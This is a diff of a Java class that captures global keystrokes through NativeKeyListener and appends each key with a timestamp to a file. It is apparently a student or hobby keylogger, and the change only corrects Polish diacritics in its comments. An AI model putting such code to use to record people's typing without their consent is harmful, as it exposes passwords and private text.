@@ -20,10 +20,10 @@ public class GlobalKeyListener implements NativeKeyListener {
     private static final DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss:SSS");
 
     /**
-     * Metoda wykonuje sie w momencie wcisniecia klawisza na klawiaturze.
-     * Tekst przypisany do wcisnietego klawisza dopisujemy do pliku.
+     * Metoda wykonuje się w momencie wciśnięcia klawisza na klawiaturze.
+     * Tekst przypisany do wciśniętego klawisza dopisywany jest do pliku.
      *
-     * @param e zdarzenie wcisnieca klawisza
+     * @param e zdarzenie wciśnięcia klawisza
      */
     public void nativeKeyPressed(NativeKeyEvent e) {
         Calendar calendar = Calendar.getInstance();
@@ -32,10 +32,10 @@ public class GlobalKeyListener implements NativeKeyListener {
     }
 
     /**
-     * Metoda wykonuje sie w momencie puszczenia klawisza na klawiaturze.
-     * Jesli puszczony klawisz byl klawiszem funkcyjnym - zapisujemy go do pliku.
+     * Metoda wykonuje się w momencie puszczenia klawisza na klawiaturze.
+     * Jeśli puszczony klawisz był klawiszem funkcyjnym - zapisujemy go do pliku.
      *
-     * @param e zdarzenie wcisnieca klawisza
+     * @param e zdarzenie wciśnięcia klawisza
      */
     public void nativeKeyReleased(NativeKeyEvent e) {
         if (e.getKeyCode() == NativeKeyEvent.VC_ALT ||
@@ -48,20 +48,20 @@ public class GlobalKeyListener implements NativeKeyListener {
     }
 
     /**
-     * Metoda wywoluje sie w momencie nacisniecia przycisku. Metoda potrafi rozpoznac, czy wcisnieta byla mala/duza litera.
-     * Nie dziala, bo nie ma zaimplementowanej mapy klawiszy.
+     * Metoda wywołuje się w momencie naciśniecia przycisku. Metoda potrafi rozpoznać, czy wcisnieta była mała/duża litera.
+     * Nie działa, bo nie ma zaimplementowanej mapy klawiszy.
      *
-     * @param e zdarzenie wcisnieca klawisza
+     * @param e zdarzenie wciśnięcia klawisza
      */
     public void nativeKeyTyped(NativeKeyEvent e) {
         e.getKeyChar();
     }
 
     /**
-     * Metoda dopusuje tekst na koncy pliku. W przypadku, gdy plik nie istenieje - zostanie on stworzony.
+     * Metoda dopusuje tekst na końcu pliku. W przypadku, gdy plik nie istenieje - zostanie on stworzony.
      *
-     * @param text tekst, ktory chcemy dopisac do pliku
-     * @param date dokladny czas wystapienia zdarzenia
+     * @param text tekst, który chcemy dopisać do pliku
+     * @param date dokładny czas wystąpienia zdarzenia
      */
     private void writeToFile(String text, Date date) {
         try {
